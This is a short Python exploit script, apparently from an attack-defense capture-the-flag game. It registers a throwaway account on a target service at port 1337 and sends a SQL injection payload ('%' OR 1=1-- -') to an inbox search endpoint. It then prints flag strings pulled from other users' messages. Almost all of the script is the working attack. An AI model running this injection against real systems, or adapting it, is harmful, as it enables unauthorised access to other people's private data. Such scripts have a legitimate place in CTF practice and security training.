#!/usr/bin/env python3

import random
import re
import string
import sys

import requests

FLAG_RE = re.compile(r"[A-Z][A-Z0-9]{30}=")


def main():
    ip = sys.argv[1]
    base = f"http://{ip}:1337"

    s = requests.Session()
    cred = "".join(random.choices(string.ascii_lowercase, k=12))
    s.post(f"{base}/api/register", json={"username": cred, "password": cred}, timeout=5)

    payload = "%' OR 1=1-- -"
    r = s.get(f"{base}/api/inbox/search", params={"q": payload}, timeout=5)

    for row in r.json().get("results", []):
        for flag in FLAG_RE.findall(str(row.get("message", ""))):
            print(flag, flush=True)


if __name__ == "__main__":
    main()
